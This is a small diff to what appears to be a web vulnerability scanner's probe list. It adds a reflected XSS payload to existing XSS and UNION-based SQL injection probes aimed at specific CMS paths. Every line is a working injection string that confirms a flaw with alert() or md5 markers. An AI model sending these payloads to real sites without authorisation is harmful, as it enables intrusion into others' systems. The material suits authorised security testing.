@@ -1,3 +1,4 @@
 /e/ViewImg/index.html?url=javascript:alert(1)
 /ikaimi/rolling/list.php?line=10&page=&classid=10)%20UNION%20ALL%20SELECT%20CONCAT(0x71786a7171,md5(123),0x716a6b6b71),NULL,NULL,NULL,NULL--+-
 /pf/rate.php?id=-1+UNION+ALL+SELECT+NULL,CONCAT(0x23,md5(123),0x23)--+-
+/e/ViewImg/index.html?url=javascript:alert(document.domain)
